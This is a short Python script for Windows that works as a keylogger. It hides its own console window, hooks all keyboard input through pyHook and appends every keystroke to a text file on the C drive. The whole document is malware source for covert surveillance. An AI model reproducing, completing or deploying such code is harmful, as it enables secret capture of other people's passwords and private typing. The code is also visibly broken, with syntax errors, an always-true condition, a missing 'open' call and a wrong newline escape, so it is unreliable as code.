#import library classes
import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):

    if eventAscii==5
        _exit(1)

    if event.Ascii !=0 or 8:

        f = open('c:\output.txt', 'r+') #Create the file on the C drive

        buffer = f.read()
        f.close() #close the file when user stops typing

        #starts typing again
        #Open Output.txt to write current and new keystroke
        f = ('c:\output.txt', 'w')

        keylogs = chr(event.Ascii)

        if event.Ascii == 13:

        keylogs = '/n'

        buffer += keylogs
        f.write(buffer)
        f.close()

#Create a hook for the manager objects

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

#set the hook
hm.HookKeyboard()

#wait forever
pythoncom.PumpMessages()